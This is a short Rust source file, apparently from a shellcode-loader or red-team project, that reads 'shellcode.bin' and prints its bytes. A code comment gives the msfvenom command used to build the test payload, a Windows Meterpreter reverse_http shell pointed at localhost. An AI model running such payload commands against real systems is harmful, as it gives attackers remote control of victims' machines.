use std::path::Path;

fn shellcode_reader_from_file(path: &Path) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let bytes = std::fs::read(path)?;
    Ok(bytes)
}

pub fn meta_shellcode_reader() {
    let path_to_shellcode_file = Path::new("shellcode.bin");
    let shellcode = shellcode_reader_from_file(path_to_shellcode_file);

    match shellcode {
        Ok(bytes) => {
            // shellcode used for tests msfvenom -p windows/x64/meterpreter_reverse_http LHOST=127.0.0.1 EXITFUNC=thread LPORT=80 -f raw -o shellcode.bin
            dbg!(bytes);
        }
        Err(err) => panic!("{:?}", err),
    }
}